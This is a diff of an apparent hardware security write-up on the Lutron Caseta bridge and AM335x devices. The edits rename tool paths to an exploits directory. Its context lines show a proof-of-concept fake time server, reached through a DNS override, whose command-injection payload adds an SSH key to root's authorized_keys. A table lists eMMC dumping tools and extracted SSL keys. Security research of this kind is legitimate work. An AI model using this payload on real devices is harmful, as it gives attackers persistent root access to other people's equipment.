@@ -392,7 +392,7 @@ The time server URL is hardcoded in `/etc/lutron.d/timeUrls`:
 
 ### Proof of Concept (tested 2026-04-01 on v08.25.17f000)
 
-Exploit server (`tools/fake-time-server.py`):
+Exploit server (`exploits/caseta/fake-time-server.py`):
 ```python
 # Responds to POST /api/v1/devices/utctime with:
 PAYLOAD = "$(mkdir -p /root/.ssh && echo 'KEY' >> /root/.ssh/authorized_keys && echo 0)"
@@ -402,7 +402,7 @@ Setup:
 ```bash
 # 1. DNS override: device-login.lutron.com -> attacker IP
 # 2. Block NTP: firewall drop UDP:123 from bridge
-# 3. Run server: sudo python3 tools/fake-time-server.py
+# 3. Run server: sudo python3 exploits/caseta/fake-time-server.py
 # 4. Power cycle bridge, wait ~10 minutes
 ```
 
@@ -647,10 +647,10 @@ The original approach was to build a custom U-Boot SPL to fully boot the AM335x 
 
 | File | Location | Purpose |
 |------|----------|---------|
-| `tools/phoenix-emmc-read.S` | project | ARM assembly eMMC reader source |
-| `tools/phoenix-emmc-build.sh` | project | Assembles + wraps binary with GP header |
-| `tools/phoenix-emmc-dump.py` | project | Pi script: boot + sector reads + GPT parsing |
-| `tools/phoenix-emmc-extract.py` | project | Pi script: boot + ext4 navigation + file extraction |
-| `tools/phoenix-uart-boot.py` | project | Original XMODEM sender (Mac side) |
+| `exploits/am335x-uart-boot/phoenix-emmc-read.S` | project | ARM assembly eMMC reader source |
+| `exploits/am335x-uart-boot/phoenix-emmc-build.sh` | project | Assembles + wraps binary with GP header |
+| `exploits/am335x-uart-boot/phoenix-emmc-dump.py` | project | Pi script: boot + sector reads + GPT parsing |
+| `exploits/am335x-uart-boot/phoenix-emmc-extract.py` | project | Pi script: boot + ext4 navigation + file extraction |
+| `exploits/am335x-uart-boot/phoenix-uart-boot.py` | project | Original XMODEM sender (Mac side) |
 | `data/phoenix-ssl/` | project | Extracted SSL keys and certificates |
 | `/tmp/phoenix-boot/` | local | Build artifacts, test binaries, DDR experiments |
